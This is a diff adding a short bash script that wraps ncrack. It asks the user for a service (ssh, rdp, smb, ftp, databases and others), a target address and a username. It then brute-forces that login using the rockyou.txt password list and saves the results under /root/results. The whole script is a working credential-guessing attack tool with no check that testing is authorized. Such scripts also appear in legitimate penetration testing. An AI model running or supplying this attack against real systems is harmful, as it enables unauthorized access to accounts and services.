@@ -1,0 +1,34 @@
+#!/bin/bash
+echo "Please type down the service name that you would like to brute-force"
+echo ""
+echo "ftp
+ssh
+telnet
+http
+https
+pop3
+imap
+Netbios-ssn
+smb
+owa
+sip
+pop3s
+mssq
+mysql
+Ms-wbt-server
+rdp
+psql
+vnc
+redis
+winrm
+cassandra
+mongodb"
+read service
+echo "Please type the Ip Address or Domain Name"
+echo ""
+read address
+echo "Please type the Username you wish to use"
+echo ""
+read username
+echo "The" $service "service will be brute forced for User" $username "on" $address
+ncrack -v -f --user $username -P /usr/share/wordlists/rockyou.txt $service://$address,CL=1 -oN /root/results/ncrack-$service-$username-$address.txt && cat /root/results/ncrack-$service-$username-$address.txt
